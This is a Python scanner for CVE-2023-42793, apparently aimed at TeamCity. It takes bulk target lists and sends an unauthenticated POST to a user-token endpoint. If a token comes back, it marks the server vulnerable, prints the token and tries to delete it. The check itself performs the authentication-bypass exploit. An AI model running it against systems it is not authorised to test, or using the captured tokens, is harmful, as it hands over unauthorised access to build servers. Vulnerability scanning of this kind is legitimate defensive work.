# python3 .\RPC_scanner.py http://192.168.208.1:8111
import argparse
import http.client
import socket
import ssl
import sys
import xml.etree.ElementTree as ET
from urllib.parse import urlparse

PATH = "/app/rest/users/id:1/tokens/RPC2"


def request(scheme, host, port, method, timeout):
    if scheme == "https":
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        conn = http.client.HTTPSConnection(host, port, timeout=timeout, context=ctx)
    else:
        conn = http.client.HTTPConnection(host, port, timeout=timeout)
    try:
        conn.request(method, PATH, headers={
            "Host": f"{host}:{port}",
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": "0",
        })
        resp = conn.getresponse()
        return resp.status, resp.read()
    finally:
        conn.close()


def scan(target, timeout):
    parsed = urlparse(target)
    scheme = parsed.scheme
    host = parsed.hostname
    port = parsed.port or (443 if scheme == "https" else 80)

    try:
        status, body = request(scheme, host, port, "POST", timeout)
    except (socket.timeout, ConnectionError, OSError, http.client.HTTPException) as e:
        return "INDETERMINATE", f"connection error: {e}"

    if status == 200:
        try:
            token = ET.fromstring(body.decode("utf-8", errors="ignore")).attrib.get("value", "")
        except ET.ParseError:
            token = ""

        if token:
            try:
                request(scheme, host, port, "DELETE", timeout)
            except Exception:
                pass
            return "VULNERABLE", f"token created without authentication (value: {token})"
        return "INDETERMINATE", "HTTP 200 but no token found in response"

    if status in (401, 403):
        return "NOT VULNERABLE", f"HTTP {status} — authentication enforced"

    return "INDETERMINATE", f"HTTP {status}"


def main():
    parser = argparse.ArgumentParser(description="CVE-2023-42793 scanner")
    parser.add_argument("targets", nargs="*", help="http(s)://host:port")
    parser.add_argument("-f", "--targets-file", action="append", metavar="FILE")
    parser.add_argument("--timeout", type=float, default=10.0)
    args = parser.parse_args()

    targets = list(args.targets)
    for f in (args.targets_file or []):
        try:
            with open(f) as fh:
                targets += [l.strip() for l in fh if l.strip() and not l.startswith("#")]
        except OSError as e:
            print(f"[!] {e}", file=sys.stderr)

    if not targets:
        parser.error("provide at least one target")

    for target in targets:
        classification, detail = scan(target, args.timeout)
        label = {"VULNERABLE": "[+]", "NOT VULNERABLE": "[-]"}.get(classification, "[?]")
        print(f"{label} {target} — {classification}: {detail}")


if __name__ == "__main__":
    main()